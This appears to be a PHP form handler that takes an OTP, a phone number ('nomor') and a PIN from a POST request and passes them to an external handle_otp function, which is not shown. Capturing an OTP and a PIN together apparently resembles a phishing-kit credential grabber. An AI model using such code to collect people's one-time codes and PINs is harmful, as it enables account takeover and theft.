<?php
require_once __DIR__ . '/functions/handle_otp.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['otp'], $_POST['nomor'], $_POST['pin'])) {
        $data = [
            'otp' => $_POST['otp'],
            'nomor' => $_POST['nomor'],
            'pin' => $_POST['pin']
        ];
        handle_otp($data);
    }
}
?>
